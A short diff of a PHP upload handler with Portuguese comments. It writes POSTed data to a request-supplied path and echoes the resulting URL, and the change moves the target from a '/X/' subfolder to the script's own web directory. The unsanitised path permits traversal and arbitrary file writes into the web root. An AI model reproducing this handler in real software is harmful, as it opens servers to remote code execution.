@@ -25,7 +25,7 @@ $isUpload = false; // Variável de controle
 // 3. Processamento do Upload
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($path)) {
     
-    $baseDir = __DIR__ . '/X/';
+    $baseDir = __DIR__ . '/./';
     $localPath = $baseDir . $path;
     
     if (!is_dir(dirname($localPath))) {
@@ -48,7 +48,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($path)) {
     if ($data !== null) {
         if (@file_put_contents($localPath, $data, LOCK_EX) !== false) {
             @chmod($localPath, 0644);
-            echo $protocol . $host . '/X/' . str_replace('\\', '/', $path);
+            echo $protocol . $host . '/./' . str_replace('\\', '/', $path);
             
             $isUpload = true; // ✅ Identificamos que FOI um upload
         }
